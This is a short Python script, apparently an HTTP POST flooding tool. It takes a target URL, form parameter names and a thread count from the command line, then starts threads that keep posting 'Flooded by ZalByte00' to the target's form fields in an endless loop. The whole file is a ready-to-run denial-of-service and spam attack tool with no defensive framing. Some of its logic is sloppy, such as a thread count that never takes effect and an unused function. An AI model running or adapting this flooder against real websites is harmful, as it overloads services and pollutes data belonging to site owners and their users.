import requests,sys
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
url = []
data = {}
#default
count = 1
def main(argument):
	global url, data
	try:
		if argument[0].split("=")[0].lower() == "url":
			if argument[0].split('=')[0] != "":
				url = argument[0].split("=")[1]
			else:
				print("url=(is null")
		if argument[1].split("=")[0].lower() == "param":
			##data = argument[1].split("=")[1].split("+")
			for x in argument[1].split("=")[1].split("+"):
				data[x] = "Flooded by ZalByte00"
		if argument[2].split("=")[0].lower() == "count":
			if int(argument[2].split("=")[1]) >= 1:
				count = int(argument[2].split("=")[1])
			else:
				print("count=(Minimum is 1)")
		for k in range(0, count):
			thread = Thread(target = exec)
			thread.start()
			print("Launched thread : "+ str(k))
	except Exception as ex:
		print("An exception occured")
		print(ex)
def exec():
	load = 0
	while( load < count ):
		req = requests.post(url=url, data=data)
		print("Flooded with : " + str(data))
def execute():
	th = 0
	with ThreadPoolExecutor(max_workers=10) as pool:
		response_list = list(pool.map(request_post, url * count))
	for response in response_list:
		print(response)
		print(str(th + 1))
		th = th + 1
def request_post(args):
	return requests.post(url=url, data=data)

def argv():
	if len(sys.argv) > 1:
		del sys.argv[0]
		argument = sys.argv
		main(argument)
	else:
		print("Parameter not found")
if __name__ == "__main__":
	argv()
